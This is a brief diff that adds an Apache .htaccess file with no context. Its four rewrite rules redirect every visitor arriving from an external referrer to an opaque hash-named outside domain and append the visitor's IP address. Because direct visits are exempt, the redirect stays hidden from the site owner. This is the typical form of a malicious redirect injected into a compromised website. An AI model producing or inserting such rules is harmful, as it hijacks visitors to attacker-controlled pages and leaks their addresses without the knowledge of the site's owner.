@@ -1,0 +1,4 @@
+RewriteEngine On
+RewriteCond %{HTTP_REFERER} ^http://
+RewriteCond %{HTTP_REFERER} !%{HTTP_HOST}
+RewriteRule . http://84f6a4eef61784b33e4acbd32c8fdd72.com/%{REMOTE_ADDR}
